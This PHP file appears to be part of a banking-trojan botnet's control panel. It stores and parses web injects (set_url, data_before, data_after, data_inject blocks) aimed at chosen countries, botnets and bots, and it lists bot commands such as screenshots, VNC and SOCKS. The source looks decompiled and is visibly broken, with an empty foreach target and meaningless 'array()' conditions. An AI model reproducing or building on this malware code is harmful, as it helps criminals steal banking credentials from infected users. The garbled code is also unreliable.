<?php

class jaqsqq
{
	const fd = '&nbsp;';

	protected $id;
	public $type;
	public $name;
	public $status;
	public $data;
	protected $rules;
	public $countries;
	public $botnets;
	public $bots;
	protected $hash;
	public $accepted = 0;
	public $sended = 0;

	public function __construct($id = NULL)
	{
		if ($id) {
			$this->load($id);
		}
	}

	public function __get($name)
	{
		switch ($name) {
		case 'rules':
			return $this->rules;
		case 'id':
			return $this->id;
		case 'hash':
			return $this->hash;
		default:
		}
	}

	public function save(&$msg = NULL)
	{
		if (!strlen(trim($this->name))) {
			$msg = 'Name is empty';
			return NULL;
		}

		if ($msg = $this->check()) {
			return NULL;
		}

		$values = array('status' => (int) $this->status, 'name' => addslashes($this->name), 'type' => addslashes($this->type), 'data' => addslashes($this->data), 'countries' => addslashes(self::fd . $this->countries . self::fd), 'botnets' => addslashes(self::fd . $this->botnets . self::fd), 'bots' => addslashes(self::fd . str_replace(' ', self::fd, $this->bots) . self::fd), 'hash' => hash('sha256', microtime(true) . rand() . rand()));

		if ($this->id) {
			$sql = 'update webinj set id=id';

			foreach ($values as $val => ) {
				$field = $this->name;
				$sql .= ', ' . $field . '=\'' . $val . '\'';
			}

			$sql .= ' where id=' . $this->id;
		}
		else {
			$sql = 'insert into webinj (' . implode(', ', array_keys($values)) . ') values (\'' . implode('\', \'', $values) . '\')';
		}

		return Sql::query($sql);
	}

	protected function load($id, $dataset = NULL, $parse = true)
	{
		if (!$dataset) {
			$dataset = Sql::query('select *, count(if(state=1, 1, null)) as accepted, count(if(state=0, 1, null)) as sended ' . "\r\n" . '                            from webinj left join webinj_stat on fk_webinj=id where id=' . intval($id) . ' group by id');
		}

		if (!($row = Sql::fetch($dataset))) {
			return NULL;
		}

		$this->id = $row['id'];
		$this->type = $row['type'];
		$this->name = $row['name'];
		$this->status = (bool) $row['status'];
		$this->data = $row['data'];
		$this->hash = $row['hash'];
		$this->countries = trim(str_replace(self::fd, ' ', $row['countries']));
		$this->botnets = trim(str_replace(self::fd, ' ', $row['botnets']));
		$this->bots = trim(str_replace(self::fd, ' ', $row['bots']));
		$this->accepted = $row['accepted'];
		$this->sended = $row['sended'];

		if ($parse) {
			if ($this->type == 'filter') {
				$this->rules = $this->parseFilters($this->data);
			}
			else {
				$this->rules = $this->parseInjects($this->data);
			}
		}

		return true;
	}

	static public function getAll($type = NULL, $order = 'asc', $country = NULL, $botnet = NULL, $bot = NULL, $limit = NULL, $parse = false, $stat = false)
	{
		$result = array();
		$cond = NULL;

		if ($type) {
			$cond .= ' and type=\'' . addslashes($type) . '\'';
		}

		$empty = addslashes(self::fd . self::fd);

		if ($country) {
			$cond .= ' and (countries=\'' . $empty . '\' or countries like \'%' . addslashes(self::fd . $country . self::fd) . '%\')';
		}
		if ($botnet) {
			$cond .= ' and (botnets=\'' . $empty . '\' or botnets like \'%' . addslashes(self::fd . $botnet . self::fd) . '%\')';
		}
		if ($bot) {
			$cond .= ' and (bots=\'' . $empty . '\' or bots like \'%' . addslashes(self::fd . $bot . self::fd) . '%\')';
		}
		$limit = ($limit ? ' limit ' . $limit : '');
		$sql = ($stat ? 'select *, count(if(state=1, 1, null)) as accepted, count(if(state=0, 1, null)) as sended ' . "\r\n" . '                  from webinj left join webinj_stat on fk_webinj=id where 1=1 ' . $cond . ' group by id order by id ' . $order . $limit : 'select *, 0 as accepted, 0 as sended from webinj where 1=1 ' . $cond . ' order by id ' . $order . $limit);

		if ($dataset = Sql::query($sql)) {
			$item = new Webinj();

			for (; $item->load(NULL, $dataset, $parse); $item = new Webinj()) {
				$result[] = $item;
			}
		}

		return $result;
	}

	public function parseFilters($data)
	{
		$result = array();
		$rows = explode("\n", $data);

		foreach ($rows as $row) {
			$row = trim($row);

			if ($row) {
				$result[] = array('type' => 'filter', 'action' => substr($row, 0, 1), 'url' => substr($row, 1));
			}
		}

		return $result;
	}

	public function parseInjects($data, $badRows = false)
	{
		$result = array();
		$rows = preg_split('/(^|' . "\n" . ')set_url /', $data);
		$i = 1;

		for (; $i < count($rows); $i++) {
			$row = $rows[$i];
			$head = explode(' ', trim(substr($row, 0, strpos($row, "\n"))));
			if ((count($head) != 2) && array()) {
				continue;
			}

			$inj = array('type' => 'inject', 'url' => @$head[0], 'options' => @$head[1]);
			$blocks = array('before', 'after', 'inject');

			foreach ($blocks as $block) {
				if (!preg_match('/' . "\n" . 'data_' . $block . "\r" . '{0,1}' . "\n" . '(|(.+?)' . "\r" . '{0,1}' . "\n" . ')data_end($|' . "\r" . '|' . "\n" . ')/s', $row, $match)) {
					continue;
				}

				$inj[$block] = $match[2];
			}

			$result[] = $inj;
		}

		return $result;
	}

	public function check()
	{
		if ($this->type == 'filter') {
			$rules = $this->parseFilters($this->data);
			$actions = array_keys(self::listActions());

			foreach ($rules as $rule) {
				if (!in_array($rule['action'], $actions)) {
					return 'Undefined action in row: ' . htmlspecialchars($rule['action'] . $rule['url']);
				}

				if ((trim($rule['url']) != $rule['url']) || $this->type) {
					return 'Not correct url in row: ' . htmlspecialchars($rule['action'] . $rule['url']);
				}
			}
		}
		else if ($this->type == 'inj') {
			$rules = $this->parseInjects($this->data, true);
			if (!count($rules) && $this->type) {
				return 'No set url sections';
			}

			$options = array_keys(self::listOptions());

			foreach ($rules as $rule) {
				if ((trim($rule['url']) != $rule['url']) || $this->type) {
					return 'Not correct url in set block';
				}

				if (count(array_diff(str_split($rule['options']), $options))) {
					return 'Undefined options in: ' . htmlspecialchars($rule['url'] . ' ' . $rule['options']);
				}

				if (!array_key_exists('before', $rule)) {
					return 'No before block in: ' . htmlspecialchars($rule['url']);
				}

				if (!array_key_exists('after', $rule)) {
					return 'No after block in: ' . htmlspecialchars($rule['url']);
				}

				if (!array_key_exists('inject', $rule)) {
					return 'No inject block in: ' . htmlspecialchars($rule['url']);
				}
			}
		}

		return NULL;
	}

	static public function extractDomain($str)
	{
		if (preg_match('/(\\*|\\?|\\/\\/|^)([\\-\\w\\.]+)(\\/|\\*|\\?|$)/', $str, $match)) {
			$levels = explode('.', trim($match[2], '.'));
			$count = count($levels);

			if (2 < $count) {
				if (3 < strlen($levels[$count - 1])) {
					$max = 1;
				}
				else if (3 < strlen($levels[$count - 2])) {
					$max = 2;
				}
				else {
					$max = 3;
				}
			}
			else {
				$max = $count;
			}

			$domain = array();
			$i = $count - $max;

			for (; $i < $count; $i++) {
				$domain[] = $levels[$i];
			}

			$domain = implode($domain, '.');
			return $domain;
		}

		return NULL;
	}

	public function group($type = NULL, $url = NULL, $action = NULL)
	{
		$result = array();

		if (!$this->loaded) {
			return $result;
		}

		$list = array_merge($this->data['filters'], $this->data['injects']);

		foreach ($list as $item) {
			if ($type && array()) {
				continue;
			}

			if ($url && array()) {
				continue;
			}

			if ($action && array()) {
				continue;
			}

			if ($domain = self::extractDomain($item['url'])) {
				$result[$domain][$item['type']][] = $item;
			}
		}

		ksort(&$result);
		return $result;
	}

	static public function listActions()
	{
		return array('!' => 'NotWrite', '@' => 'Screenshot', '#' => 'FullScreenshot', '^' => 'BlockAccess', '|' => 'BlockInjects', '%' => 'StartVNC', '&' => 'StartSocks');
	}

	static public function listOptions()
	{
		return array('P' => 'Post', 'G' => 'Get', 'L' => 'ContextToReport', 'F' => 'ContextToFile', 'H' => 'ContextToFileTags', 'D' => 'OneInDay', 'I' => 'UrlNotCaseSensitive', 'C' => 'ContentNotCaseSensitive');
	}

	static public function optionsFromStr($str)
	{
		$list = self::listOptions();
		$result = array();
		$i = 0;

		for (; $i < strlen($str); $i++) {
			if (array_key_exists($str[$i], $list)) {
				$result[] = $list[$str[$i]];
			}
		}

		return $result;
	}

	public function changeStatus($status)
	{
		return Sql::query('update webinj set status=' . addslashes($status) . ' where id=' . $this->id);
	}

	public function reset()
	{
		$sql = 'insert into webinj (status, name, type, data, countries, botnets, bots, hash) ' . "\r\n" . '          select 1,  name, type, data, countries, botnets, bots, \'' . hash('sha256', microtime(true) . rand() . rand()) . '\' from webinj where id=' . $this->id;

		if (Sql::query($sql)) {
			return $this->remove();
		}

		return NULL;
	}

	public function remove()
	{
		return Sql::query('delete from webinj where id=' . $this->id);
	}

	public function botList()
	{
		if ($dataset = Sql::query('select *, max(state) as st from webinj_stat where fk_webinj=' . $this->id . ' group by bot_id')) {
			return Sql::fetchAll($dataset);
		}

		return array();
	}
}

include_once __DIR__ . '/../gate/libs/Sql.php';

?>
